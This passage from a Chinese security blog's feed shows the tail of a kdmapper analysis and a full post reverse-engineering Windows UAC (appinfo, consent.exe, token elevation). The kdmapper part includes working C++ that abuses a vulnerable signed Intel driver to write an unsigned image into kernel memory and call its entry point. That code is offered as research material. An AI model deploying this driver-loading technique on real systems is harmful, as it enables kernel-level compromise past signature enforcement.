		&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destroyHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TotalVirtualHeaderSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[+] Skipped 0x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TotalVirtualHeaderSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot; bytes of PE Header&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// Resolve relocs and imports&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;RelocateImageByDelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portable_executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetRelocs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ResolveImports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iqvw64e_device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portable_executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetImports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[-] Failed to resolve imports&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// Write fixed image to kernel&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intel_driver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WriteMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iqvw64e_device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destroyHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TotalVirtualHeaderSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destroyHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TotalVirtualHeaderSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[-] Failed to write local image to remote image&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// Call driver entry point&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address_of_entry_point&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddressOfEntryPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        
		&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intel_driver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CallKernelFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iqvw64e_device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address_of_entry_point&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[-] Failed to call driver entry&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;intel_driver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iqvw64e_device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;VirtualFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RELEASE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


	&lt;span class=&quot;n&quot;&gt;VirtualFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RELEASE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;intel_driver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iqvw64e_device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="driver" /><category term="re" /><summary type="html">由于dse的出现，未经签名的驱动无法被内核加载，而使用带有签名的漏洞驱动通过利用漏洞的方式加载无签名的驱动是一种可行的方式。本文将通过分析kdmapper的代码来探究加载无签名驱动的方法。</summary></entry><entry><title type="html">UAC逆向</title><link href="https://citrusice.github.io/posts/uac-reversing/" rel="alternate" type="text/html" title="UAC逆向" /><published>2021-04-07T14:17:43+08:00</published><updated>2021-04-07T14:17:43+08:00</updated><id>https://citrusice.github.io/posts/uac-reversing</id><content type="html" xml:base="https://citrusice.github.io/posts/uac-reversing/">&lt;p&gt;网上的文章关于uac的具体细节太少，大部分都是如何绕过uac，但是如果不了解uac的机制又怎么能理解那些绕过的手法呢，于是便决定去逆向uac。&lt;/p&gt;

&lt;h2 id=&quot;谁拉起的elevated进程&quot;&gt;谁拉起的elevated进程&lt;/h2&gt;

&lt;p&gt;尽管在任务管理器中使用管理员身份启动的进程的父进程是explorer，但是在explorer中KERNELBASE!CreateProcessW位置下断，使用管理员权限运行程序，并不会断下，而正常启动程序则可以正常断下来，这说明elevated的程序很有可能并非是由explorer拉起的。从权限的角度想这也很合理：explorer本身并不是一个system进程或elevated的进程，如果是由explorer拉起，那自然也不可能达到提权的目的。&lt;/p&gt;

&lt;p&gt;如果以管理员身份启动程序并不会调用CreateProcessW，那肯定是在某一个函数中走了另一个分支。因此正常启动一个程序，断下，查看调用栈进行分析，尝试确定关键函数&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; bp /p ffffbb86ae9da340 kernelbase!createprocessw
0: kd&amp;gt; g
Breakpoint 3 hit
KERNELBASE!CreateProcessW:
0033:00007ffc`4f576a50 4c8bdc          mov     r11,rsp
0: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 00000000`0630d998 00007ffc`502dcbb4     KERNELBASE!CreateProcessW
01 00000000`0630d9a0 00007ffc`4d4c0ccd     KERNEL32!CreateProcessWStub+0x54
02 00000000`0630da00 00007ffc`4d47d68c     windows_storage!CInvokeCreateProcessVerb::CallCreateProcess+0x13d
03 00000000`0630dca0 00007ffc`4d478e54     windows_storage!CInvokeCreateProcessVerb::_PrepareAndCallCreateProcess+0x2b0
04 00000000`0630dd20 00007ffc`4d47778b     windows_storage!CInvokeCreateProcessVerb::_TryCreateProcess+0x3c
05 00000000`0630dd50 00007ffc`4d47740d     windows_storage!CInvokeCreateProcessVerb::Launch+0xef
06 00000000`0630ddf0 00007ffc`4d47c4b5     windows_storage!CInvokeCreateProcessVerb::Execute+0x5d
........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;经过测试，CInvokeCreateProcessVerb::CallCreateProcess就是我们要找的关键函数。用ida对这个函数进行逆向，发现在以管理员身份运行程序时CInvokeCreateProcessVerb::CallCreateProcess会去调用AicLaunchAdminProcess，而AicLaunchAdminProcess本身并不拉起进程，而是做了rpc通信，看来真正拉起权限提升进程的程序并非是explorer&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210320132941566.png&quot; alt=&quot;image-20210320132941566&quot; /&gt;&lt;/p&gt;

&lt;p&gt;根据创建binding handle时使用的uuid在rpcview找到对应的接口，发现是一个svchost起的服务&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210320132923499.png&quot; alt=&quot;image-20210320132923499&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从启动命令行中可以看到是appinfo&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210320133100719.png&quot; alt=&quot;image-20210320133100719&quot; /&gt;&lt;/p&gt;

&lt;p&gt;根据rpcview中显示的procedure地址，我们可以找到对应的dll，也就是appinfo.dll&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210320133248408.png&quot; alt=&quot;image-20210320133248408&quot; /&gt;&lt;/p&gt;

&lt;p&gt;根据接口地址找到对应函数RAiLaunchAdminProcess&lt;/p&gt;

&lt;p&gt;在RAiLaunchAdminProcess中，我们可以看到最终调用了AiLaunchProcess，而AiLaunchProcess又是对CreateProcessAsUserW的封装，可以看出权限提升的进程最终是由appinfo服务进程拉起来的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210406175451171.png&quot; alt=&quot;image-20210406175451171&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;什么样的程序可以不弹出uac窗口&quot;&gt;什么样的程序可以不弹出uac窗口&lt;/h2&gt;

&lt;p&gt;首先要找到使uac弹窗的函数&lt;/p&gt;

&lt;p&gt;以管理员权限打开一个程序，弹出uac窗口后，windbg断下来，切换到appinfo服务所在的进程，打印所有线程的栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; !process 48c 6
........
        THREAD ffffbb86af9b7080  Cid 048c.18b0  Teb: 000000eb9578f000 Win32Thread: ffffbb86b02046c0 WAIT: (UserRequest) UserMode Non-Alertable
            ffffbb86aa520080  ProcessObject
        Not impersonating
        DeviceMap                 ffffa90e43a35600
        Owning Process            ffffbb86add680c0       Image:         svchost.exe
        Attached Process          N/A            Image:         N/A
        Wait Start TickCount      21551          Ticks: 509 (0:00:00:07.953)
        Context Switch Count      3579           IdealProcessor: 1             
        UserTime                  00:00:00.265
        KernelTime                00:00:00.578
        Win32 Start Address ntdll!TppWorkerThread (0x00007ffc51aa20e0)
        Stack Init ffffb90acbaa7c90 Current ffffb90acbaa76a0
        Base ffffb90acbaa8000 Limit ffffb90acbaa2000 Call 0000000000000000
        Priority 9 BasePriority 8 PriorityDecrement 0 IoPriority 2 PagePriority 5
        Child-SP          RetAddr               : Args to Child                                                           : Call Site
        ffffb90a`cbaa76e0 fffff803`1b0e4e60     : ffffbb86`00000008 00000000`ffffffff ffffb90a`00000000 ffffbb86`ae3d2158 : nt!KiSwapContext+0x76
        ffffb90a`cbaa7820 fffff803`1b0e438f     : 00000000`00000009 00000000`00000000 ffffb90a`cbaa79e0 ffffffff`fffffffe : nt!KiSwapThread+0x500
        ffffb90a`cbaa78d0 fffff803`1b0e3c33     : ffff5817`00000000 fffff803`00000000 00000000`00000000 ffffbb86`af9b71c0 : nt!KiCommitThreadWait+0x14f
        ffffb90a`cbaa7970 fffff803`1b4f6531     : ffffbb86`aa520080 fffff803`00000006 ffffb90a`cbaa7b01 ffffb90a`cbaa7b00 : nt!KeWaitForSingleObject+0x233
        ffffb90a`cbaa7a60 fffff803`1b4f65da     : ffffbb86`af9b7080 00000000`00000000 00000000`00000000 00000000`00000000 : nt!ObWaitForSingleObject+0x91
        ffffb90a`cbaa7ac0 fffff803`1b20bbb5     : ffffbb86`af9b0000 00000000`00001000 00000000`00000000 00000000`00000000 : nt!NtWaitForSingleObject+0x6a
        ffffb90a`cbaa7b00 00007ffc`51b2be24     : 00007ffc`4f5926ee 00000000`00000022 00000023`00000004 00000004`00000000 : nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ ffffb90a`cbaa7b00)
        000000eb`99f7e1f8 00007ffc`4f5926ee     : 00000000`00000022 00000023`00000004 00000004`00000000 00000000`00000024 : ntdll!NtWaitForSingleObject+0x14
        000000eb`99f7e200 00007ffc`38537bf9     : 00000000`00000000 00000000`00000001 000000eb`00000000 00000000`00001c88 : KERNELBASE!WaitForSingleObjectEx+0x8e
        000000eb`99f7e2a0 00007ffc`38537503     : 00000000`00000000 00000220`790095e0 000000eb`00000002 00000000`00000004 : appinfo!AiLaunchConsentUI+0x559
        000000eb`99f7e4c0 00007ffc`38536ba2     : 00000000`00000021 00000000`00000021 00000000`00000000 00000220`7c39e7f8 : appinfo!AiCheckLUA+0x343
        000000eb`99f7e6a0 00007ffc`50772153     : 00000220`7b1f3e00 00000220`7b245df0 00000220`7c39e7f8 00000220`7c39e860 : appinfo!RAiLaunchAdminProcess+0xbe2
        000000eb`99f7ecb0 00007ffc`507da5ea     : 00000220`7b1f3e00 00000220`7b23fae0 00000220`772b1ae0 00007ffc`00000000 : RPCRT4!Invoke+0x73
        000000eb`99f7ed60 00007ffc`50756838     : 00000220`75a80000 00007ffc`51aa7000 00000220`0000000c 
        ...................
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在茫茫线程中一番搜寻，很快便找到了我们想要的。可以看到UAC的弹窗流程是&lt;/p&gt;

&lt;p&gt;RAiLaunchAdminProcess -&amp;gt; AiCheckLUA -&amp;gt; AiLaunchConsentUI&lt;/p&gt;

&lt;p&gt;接下来开始逆AiLaunchConsentUI这个函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404131558600.png&quot; alt=&quot;image-20210404131558600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;构造命令行后会调用AiLaunchProcess来启动consent.exe，也就是真正绘制uac窗口的程序&lt;/p&gt;

&lt;p&gt;为了快速定位关键代码，我们切换到consent.exe，打印consent.exe的线程栈，可惜这次并没有找到我们想要的，只好接着逆向consent.exe。&lt;/p&gt;

&lt;p&gt;同时继续提出几个问题&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在consent绘制的uac窗口上，我们可以看到要进行权限提升的程序的路径，命令行等等相关信息，consent是如何获取这些信息的？&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404133752729.png&quot; alt=&quot;image-20210404133752729&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404134511322.png&quot; alt=&quot;image-20210404134511322&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;答案就在consent的命令行中。consent的命令行中传入了父进程的pid（appinfo服务的进程pid），一个结构体长度以及一个指向结构体的指针，随后consent调用NtReadVirtualMemory从父进程的内存中读取结构体的内容，这个结构体中就包含了需要特权提升的进程信息。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;特权提升的进程最终是由appinfo服务进程拉起的，但是uac窗口则是consent绘制的，那consen如何将用户的操作反馈给appinfo服务进程？&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404134338774.png&quot; alt=&quot;image-20210404134338774&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;同样是通过读写appinfo进程的内存实现&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;通过逆向找到了决定是否弹窗的关键函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404135241498.png&quot; alt=&quot;image-20210404135241498&quot; /&gt;&lt;/p&gt;

&lt;p&gt;关键代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404135516888.png&quot; alt=&quot;image-20210404135516888&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到consent是否弹窗主要由父进程传入的结构体确定，因此再返回appinfo继续逆向&lt;/p&gt;

&lt;p&gt;详细细节有些复杂，所以直接贴部分代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404135951243.png&quot; alt=&quot;image-20210404135951243&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404140004231.png&quot; alt=&quot;image-20210404140004231&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404140056297.png&quot; alt=&quot;image-20210404140056297&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210404140115678.png&quot; alt=&quot;image-20210404140115678&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到对程序所处的路径有限制，同时包含一些白名单校验，当满足这些条件后，consent便不会绘制uac窗口。&lt;/p&gt;

&lt;h2 id=&quot;令牌的权限提升过程&quot;&gt;令牌的权限提升过程&lt;/h2&gt;

&lt;p&gt;权限提升的过程位于consent中，consent从appinfo服务进程中获取未权限提升的令牌后，调用NtQueryInformationToken获取一个权限提升的令牌（undocument的用法），随后将这个token写回到appinfo服务进程中，appinfo再使用这个提升后的令牌创建进程。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210406164130159.png&quot; alt=&quot;image-20210406164130159&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过NtQueryInformationToken获取权限提升的令牌&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210406164314330.png&quot; alt=&quot;image-20210406164314330&quot; /&gt;&lt;/p&gt;

&lt;p&gt;将令牌写回到appinfo的进程中去&lt;/p&gt;

&lt;p&gt;文章写得有些简略，只是大致写了部分流程。断断续续逆了快两个月，终于看到了UAC的全貌，感觉十分舒畅。&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">网上的文章关于uac的具体细节太少，大部分都是如何绕过uac，但是如果不了解uac的机制又怎么能理解那些绕过的手法呢，于是便决定去逆向uac。</summary></entry><entry><title type="html">Psexec Internal</title><link href="https://citrusice.github.io/posts/psexec-internal/" rel="alternate" type="text/html" title="Psexec Internal" /><published>2021-02-24T12:17:31+08:00</published><updated>2021-02-24T12:17:31+08:00</updated><id>https://citrusice.github.io/posts/psexec-internal</id><content type="html" xml:base="https://citrusice.github.io/posts/psexec-internal/">&lt;p&gt;psexec是后渗透的常用工具，拥有一个目标系统的账户后我们可以通过它在目标系统执行命令。但是它是如何工作的？这篇文章将记录我的研究过程。&lt;/p&gt;

